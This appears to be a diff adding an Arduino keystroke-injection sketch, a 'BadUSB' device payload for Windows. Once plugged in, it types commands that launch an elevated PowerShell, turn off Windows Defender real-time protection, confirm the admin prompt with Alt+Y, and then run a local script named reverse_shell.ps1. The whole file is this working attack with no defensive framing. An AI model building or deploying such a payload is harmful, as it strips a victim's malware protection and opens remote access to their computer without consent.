@@ -1,0 +1,68 @@
+#include <HID-Project.h>
+#include <HID-Settings.h>
+
+// Utility function
+void typeKey(int key){
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
+}
+
+void setup()
+{
+  // Start Keyboard and Mouse
+  AbsoluteMouse.begin();
+  Keyboard.begin();
+
+  // Start Payload
+  delay(10000);
+
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press(114);
+  Keyboard.releaseAll();
+
+  delay(2000);
+
+  Keyboard.print("cmd.exe");
+
+  typeKey(KEY_RETURN);
+
+  delay(1000);
+
+  Keyboard.print("powershell start-process powershell -A 'Set-MpPreference -DisableRea $true' -Verb runAs");
+
+  typeKey(KEY_RETURN);
+
+  delay(3000);
+
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press(121);
+  Keyboard.releaseAll();
+
+  delay(20000);
+
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press(114);
+  Keyboard.releaseAll();
+
+  delay(2000);
+
+  Keyboard.print("cmd");
+
+  typeKey(KEY_RETURN);
+
+  delay(1000);
+
+  Keyboard.print("PowerShell -ExecutionPolicy RemoteSigned .\\reverse_shell.ps1");
+
+  typeKey(KEY_RETURN);
+
+  // End Payload
+
+  // Stop Keyboard and Mouse
+  Keyboard.end();
+  AbsoluteMouse.end();
+}
+
+// Unused
+void loop() {}
